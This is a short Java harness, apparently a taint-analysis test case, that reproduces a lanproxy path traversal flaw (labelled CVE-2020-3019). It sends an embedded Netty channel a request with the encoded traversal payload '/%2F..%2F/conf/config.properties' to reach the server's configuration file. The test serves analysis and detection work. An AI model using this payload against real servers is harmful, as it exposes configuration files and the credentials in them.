import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.http.DefaultFullHttpRequest;
import io.netty.handler.codec.http.HttpMethod;
import io.netty.handler.codec.http.HttpVersion;
import org.fengfei.lanproxy.server.config.web.HttpRequestHandler;

// CVE-2020-3019
public class Server {
    public static void main(String[] args) throws Exception {
        HttpRequestHandler httpRequestHandler = new HttpRequestHandler();
        EmbeddedChannel channel = new EmbeddedChannel(httpRequestHandler);
        channel.writeInbound(getHttpRequest());
    }

    private static DefaultFullHttpRequest getHttpRequest() {
        return new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, getInput());
    }

    private static String getInput() {
        char[] chs = "http://127.0.0.1:4567/%2F..%2F/conf/config.properties".toCharArray();
        chs[0] = taint();
        return new String(chs);
    }

    public static char taint(){
        return 'h';
    }
}
